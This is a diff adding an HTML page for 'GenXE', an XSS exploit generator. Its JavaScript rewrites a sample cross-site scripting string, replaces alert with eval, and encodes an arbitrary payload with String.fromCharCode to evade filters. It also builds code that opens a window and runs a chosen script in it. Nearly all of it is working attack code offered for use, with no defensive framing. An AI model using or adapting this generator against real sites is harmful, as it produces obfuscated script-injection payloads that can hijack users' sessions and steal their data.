@@ -1,0 +1,63 @@
+
+<body background="bg.jpg">
+<INPUT TYPE="BUTTON" ONCLICK="top.frames[1].history.back()" VALUE="Back">
+<INPUT TYPE="BUTTON" ONCLICK="top.frames[1].history.forward()" VALUE="Forward">
+<SCRIPT>
+
+function Error(Msg)
+	{
+		alert("ERROR:\n\n"+Msg);
+	}
+
+function SxeToDxe(Sxe,Ds)
+	{
+		//refer to the file "SxeToDxe_HOW" of "SxeToDxe" task of "GenXE" project.
+		
+		SxeAnchor="genxe";	
+		SxeFunction="alert";
+
+		IndexA1=Sxe.indexOf(SxeAnchor+"a");
+		IndexM1=Sxe.indexOf(SxeAnchor+"m",IndexA1);
+		IndexM2=Sxe.indexOf(SxeAnchor+"m",IndexM1+1);
+		IndexA2=Sxe.indexOf(SxeAnchor+"a",IndexM2);
+		LeftBracket =Sxe.substring(IndexA1+(SxeAnchor+"a").length,IndexM1);
+		RightBracket=Sxe.substring(IndexM2+(SxeAnchor+"a").length,IndexA2);
+		Comma       =Sxe.substring(IndexM1+(SxeAnchor+"m").length,IndexM2);
+
+		DxePrefix =Sxe.substring(0,IndexA1);
+		//replace SxeFunction with "eval"
+		Index1=DxePrefix.lastIndexOf(SxeFunction);
+		Index2=Index1+SxeFunction.length;
+		DxePrefix=DxePrefix.substring(0,Index1)+"eval"+DxePrefix.substring(Index2,DxePrefix.length);
+
+		DxePostfix=Sxe.substring(IndexA2+(SxeAnchor+"m").length,Sxe.length);
+
+		EncodedDxe="eval"+LeftBracket+"String.fromCharCode"+LeftBracket;
+		for(i=0;i<=(Ds.length-1)-1;i++)
+		EncodedDxe=EncodedDxe+Ds.charCodeAt(i)+Comma;
+		EncodedDxe=EncodedDxe+Ds.charCodeAt(Ds.length-1);
+		EncodedDxe=EncodedDxe+RightBracket+RightBracket;
+
+		Dxe=DxePrefix+EncodedDxe+DxePostfix;
+		return Dxe;
+	}
+
+function HtmToJsp(Htm)
+	{
+		Jsp="document.write(unescape('" + escape(Htm) + "'))\;document.close()\;";
+		return Jsp;
+	}
+
+function SxeToSawe(Sxe,OpenDestW,Saw)
+	{	
+		Ds="DestW=null\;eval(unescape('"   +escape(OpenDestW)+   "'))\;function ExecuteSaw(){if(DestW!=null){DestW.setTimeout(unescape('"   +escape(Saw)+    "'),1)\;DestW=null\;}else{setTimeout('ExecuteSaw()',100)\;}}ExecuteSaw()\;";
+		//Ds <==> when DestW is not null, "ExecuteSaw" function will execute "Saw" script in "DestW" window for one time.
+
+		
+		Dxe=SxeToDxe(Sxe,Ds);
+		return Dxe;
+	}
+
+</SCRIPT>
+<b> <font size="6" color="#00FFFF" face="Courier New, Courier, mono"> GenXE - 
+Generate Xss Exploit</font> </b> 
